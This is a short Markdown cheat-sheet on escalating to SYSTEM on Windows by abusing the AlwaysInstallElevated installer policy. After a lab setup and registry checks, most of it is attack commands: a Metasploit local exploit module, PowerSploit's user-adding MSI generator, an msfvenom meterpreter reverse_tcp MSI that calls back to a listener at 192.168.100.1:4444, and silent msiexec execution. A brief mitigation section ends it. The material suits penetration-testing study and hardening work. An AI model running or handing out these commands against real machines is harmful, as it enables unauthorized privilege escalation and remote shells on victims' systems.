- [Always Install Elevated method](#Always-Install-Elevated-Method)

# Always Install Elevated Method

For this purpose the AlwaysInstallElevated policy feature is used to install a MSI package file with elevated (system) privileges.
his policy if enabled in the Local Group Policy editor; directs the Windows Installer engine to use elevated permissions when it installs 
any program on the system.
From the security point of view this can be abused by an attacker in order to escalate his privileges to the box to SYSTEM.

#### Lab configuration
- Type gpedit.msc in the Run dialog box of the Start Menu
- Navigate to the below path in the Windows machine
```
Computer Configuration\Administrative Templates\Windows Components\Windows Installer
```

- Enable the Always install with elevated privileges

### Check registry keys
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- Value **0x1** means that the AlwaysInstallElevated policy is enabled

### Privilege Escalation with Metasploit
```
use exploit/windows/local/always_install_elevated
set session ?
set LHOST 192.168.100.1
exploit
```

### Create MSI Package with PowerSploit
```
PS C:\Users\test> Import-Module Privesc
PS C:\Users\test> Get-RegistryAlwaysInstallElevated
PS C:\users\test> Write-UserAddMSI
```

### Create MSI Package with msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.1 lport=4444 –f msi > malicious.msi
```

### Execute the MSI package file on the Windows command prompt
```
>msiexec /quiet /qn /i malicious.msi

/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

#### Mitigation
- Disable below settings from the GPO
```
Computer Configuration\Administrative Templates\Windows Components\Windows Installer
User Configuration\Administrative Templates\Windows Components\Windows Installer
```

